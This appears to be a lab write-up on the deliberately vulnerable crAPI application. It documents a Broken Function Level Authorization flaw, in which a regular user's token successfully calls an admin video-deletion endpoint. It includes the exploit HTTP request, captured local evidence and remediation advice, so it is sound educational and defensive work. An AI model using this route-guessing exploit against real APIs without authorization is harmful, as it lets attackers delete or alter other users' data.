[🇧🇷 Português](../../vulnerabilidades/06-bfla.md) · 🇺🇸 English

# BFLA — Regular user accessing an admin function

**OWASP API Security Top 10 (2023) category:** `API5 — Broken Function Level Authorization`
**Estimated severity:** `High`
**Matching crAPI challenge:** Challenge 7 — "delete a video of another user" (via an admin endpoint)

---

## 1. Summary

There is an **admin** endpoint (for example, to delete videos) that does not check whether the caller has an administrator role. A regular user, knowing or guessing the admin route (predictable REST structure), executes a privileged function — such as deleting another user's video.

## 2. Preconditions

- A **regular user** account authenticated (no admin privileges).
- The target resource ID (e.g. another user's `video_id`).

## 3. Exploitation walkthrough

1. As a regular user, derive the admin route from the user route. If the user route is something like `/identity/api/v2/user/videos/{id}`, the predictable admin route is:

```http
DELETE /identity/api/v2/admin/videos/{video_id} HTTP/1.1
Host: localhost:8888
Authorization: Bearer <regular_user_token>
```

2. If the function executes successfully (e.g. another user's video deleted) using a token **without** an admin role, function-level authorization is broken.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/06-bfla/captura.txt`](../../../evidencias/06-bfla/captura.txt).

```
# the attacker's token has a regular role:
GET /identity/api/v2/user/dashboard  ->  "role":"ROLE_USER"

# the attacker (ROLE_USER) calls the admin function on the VICTIM's video:
DELETE /identity/api/v2/admin/videos/6
Authorization: Bearer <attacker_token>

HTTP 200
{"message":"User video deleted successfully.","status":200}
```

After the call, the victim's dashboard showed `video_id: 0` (video removed). An administrative function was executed by a regular user.

## 5. Why it is a risk

BFLA lets regular users perform **privileged operations** — deleting third-party data, accessing admin panels, changing settings. Unlike BOLA (which is about *which object* you access), BFLA is about *which function* you can execute. It is common when function authorization is done merely by hiding the route in the interface, with no role check on the server ("security by obscurity").

## 6. How to fix

- Check the user's **role/permission** on the server for every sensitive function, preferably via a central middleware per route group (e.g. everything under `/admin/` requires an admin role).
- Deny by default: admin functions unreachable unless explicitly authorized.
- Do not rely on hiding routes in the UI — the API must refuse the call even if the route is known.

## 7. References

- [API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
